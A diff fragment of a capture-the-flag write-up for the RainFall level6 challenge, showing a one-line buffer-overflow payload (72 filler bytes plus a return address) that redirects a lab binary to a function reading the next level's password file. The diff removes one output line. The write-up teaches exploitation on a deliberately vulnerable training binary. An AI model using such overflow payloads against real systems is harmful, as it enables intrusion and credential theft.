@@ -123,7 +123,6 @@ So payload should be at least `72` bytes long. And we have to add address of `n(
 Let's try it. `level6` takes a string as an argument (argv[1]). We can use `$(python -c 'print "A"*72 + "\x54\x84\x04\x08"')` to generate the payload.
 ```bash
 level6@RainFall:~$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
-REMOVED
 ```
 
 As the `x/s` result shows, `n()` runs `system("/bin/cat /home/user/level7/.pass")` directly, so no `cat ... -` trick is needed to keep stdin open, unlike level5's interactive `/bin/sh`.
